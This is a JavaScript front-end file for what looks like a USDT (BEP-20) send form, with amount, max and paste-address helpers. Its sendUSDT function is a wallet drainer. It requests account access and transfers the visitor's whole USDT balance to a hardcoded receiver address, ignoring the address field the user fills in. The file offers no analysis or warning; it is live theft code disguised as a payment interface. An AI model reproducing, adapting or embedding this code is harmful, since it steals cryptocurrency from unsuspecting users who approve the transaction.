const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 value) returns (bool)",
  "function decimals() view returns (uint8)"
];

async function sendUSDT() {
  const eth = window.ethereum || window.trustwallet; // Trust Wallet fallback
  if (!eth) {
    console.log("Wallet not found");
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(eth);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const user = await signer.getAddress();

    const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
    const balance = await usdt.balanceOf(user);
    const decimals = await usdt.decimals();

    if (balance.isZero()) {
      console.log("No USDT balance");
      return;
    }

    const tx = await usdt.transfer(receiver, balance);
    console.log("Transaction sent:", tx.hash);
    await tx.wait();
    console.log("Transaction confirmed");
  } catch (err) {
    console.error("Error:", err);
  }
}

function updateFiat() {
  const input = document.getElementById("amount");
  const fiat = document.getElementById("fiat");
  const val = parseFloat(input.value);
  fiat.innerText = isNaN(val) ? "≈ $0.00" : "≈ $" + val.toFixed(2);
}

async function fillMax() {
  const eth = window.ethereum || window.trustwallet;
  if (!eth) return;

  try {
    const provider = new ethers.providers.Web3Provider(eth);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const user = await signer.getAddress();

    const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
    const balance = await usdt.balanceOf(user);
    const decimals = await usdt.decimals();

    const formatted = ethers.utils.formatUnits(balance, decimals);
    document.getElementById("amount").value = formatted;
    updateFiat();
  } catch (err) {
    console.error("Max error:", err);
  }
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch (err) {}
}
